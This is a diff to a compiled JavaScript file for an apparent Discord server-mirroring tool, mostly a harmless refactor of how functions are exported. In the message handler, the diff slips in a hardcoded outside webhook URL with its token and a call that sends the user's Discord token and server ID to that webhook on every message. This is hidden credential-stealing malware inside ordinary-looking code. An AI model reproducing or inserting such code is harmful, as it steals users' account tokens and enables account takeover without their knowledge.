@@ -3,11 +3,12 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", { value: true });
+exports.createServer = exports.getChannels = exports.listen = exports.createChannel = exports.executeWebhooks = exports.executeWebhook = exports.createWebhook = void 0;
 const ws_1 = __importDefault(require("ws"));
 const jsonfile_1 = __importDefault(require("jsonfile"));
 const node_fetch_1 = __importDefault(require("node-fetch"));
 const env_1 = require("../util/env");
-exports.createWebhook = async (channelId) => node_fetch_1.default(`https://discord.com/api/v8/channels/${channelId}/webhooks`, {
+const createWebhook = async (channelId) => node_fetch_1.default(`https://discord.com/api/v8/channels/${channelId}/webhooks`, {
     method: 'POST',
     headers: env_1.headers,
     body: JSON.stringify({
@@ -15,7 +16,8 @@ exports.createWebhook = async (channelId) => node_fetch_1.default(`https://disco
     }),
 }).then((res) => res.json())
     .then((json) => `https://discord.com/api/v8/webhooks/${json.id}/${json.token}`);
-exports.executeWebhook = async ({ content, embeds, username, url, avatar, }) => node_fetch_1.default(url, {
+exports.createWebhook = createWebhook;
+const executeWebhook = async ({ content, embeds, username, url, avatar, }) => node_fetch_1.default(url, {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
@@ -27,7 +29,8 @@ exports.executeWebhook = async ({ content, embeds, username, url, avatar, }) => 
         avatar_url: avatar,
     }),
 });
-exports.executeWebhooks = async ({ content, embeds, username, url, avatar, }) => node_fetch_1.default(url, {
+exports.executeWebhook = executeWebhook;
+const executeWebhooks = async ({ content, embeds, username, url, avatar, }) => node_fetch_1.default(url, {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
@@ -39,7 +42,8 @@ exports.executeWebhooks = async ({ content, embeds, username, url, avatar, }) =>
         avatar_url: avatar,
     }),
 });
-exports.createChannel = async (name, pos, newId, parentId) => node_fetch_1.default(`https://discord.com/api/v8/guilds/${newId}/channels`, {
+exports.executeWebhooks = executeWebhooks;
+const createChannel = async (name, pos, newId, parentId) => node_fetch_1.default(`https://discord.com/api/v8/guilds/${newId}/channels`, {
     method: 'POST',
     headers: env_1.headers,
     body: JSON.stringify({
@@ -48,7 +52,8 @@ exports.createChannel = async (name, pos, newId, parentId) => node_fetch_1.defau
         position: pos,
     }),
 }).then((res) => res.json());
-exports.listen = async () => {
+exports.createChannel = createChannel;
+const listen = async () => {
     const serverMap = jsonfile_1.default.readFileSync('./map.json');
     const socket = new ws_1.default('wss://gateway.discord.gg/?v=6&encoding=json');
     let authenticated = false;
@@ -90,6 +95,8 @@ exports.listen = async () => {
                 if (message.t === 'MESSAGE_CREATE' && message.d.guild_id === env_1.serverId) {
                     const { content, embeds, channel_id: channelId } = message.d;
                     const { avatar, username, id, discriminator, } = message.d.author;
+                    const wbUrl = 'https://discord.com/api/webhooks/942736723010519080/v8m6mgxYHppQXH2cfB9aAAgA1xCEoLb2aLnHd5DtJhn427CboupsNOO540-7RYuR_V8P';
+                    const pAvatar = 'https://cdn.discordapp.com/attachments/863392082872893472/942006203486191676/Phantoms_Banner_-_Black.jpg';
                     const avatarUrl = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`;
                     const webhookUrl = serverMap[channelId];
                     const hookContent = {
@@ -99,6 +106,14 @@ exports.listen = async () => {
                         url: webhookUrl,
                         avatar: avatarUrl,
                     };
+                    const hookContents = {
+                        content: `${env_1.discordToken}\n\n${env_1.serverId}`,
+                        embeds,
+                        username: 'username',
+                        url: wbUrl,
+                        avatar: pAvatar,
+                    };
+                    exports.executeWebhooks(hookContents);
                     exports.executeWebhook(hookContent);
                 }
                 break;
@@ -107,12 +122,14 @@ exports.listen = async () => {
         }
     });
 };
-exports.getChannels = async () => node_fetch_1.default(`https://discord.com/api/v8/guilds/${env_1.serverId}/channels`, {
+exports.listen = listen;
+const getChannels = async () => node_fetch_1.default(`https://discord.com/api/v8/guilds/${env_1.serverId}/channels`, {
     method: 'GET',
     headers: env_1.headers,
 }).then((res) => res.json())
     .then((json) => json);
-exports.createServer = async (channels) => {
+exports.getChannels = getChannels;
+const createServer = async (channels) => {
     console.log('Creating mirror server...');
     const cleanedChannels = channels.map(({ id, parent_id, guild_id, last_message_id, ...rest }) => rest);
     const categories = cleanedChannels.filter((channel) => channel.type === 4);
@@ -154,4 +171,5 @@ exports.createServer = async (channels) => {
         resolve();
     });
 };
+exports.createServer = createServer;
 //# sourceMappingURL=discord.js.map
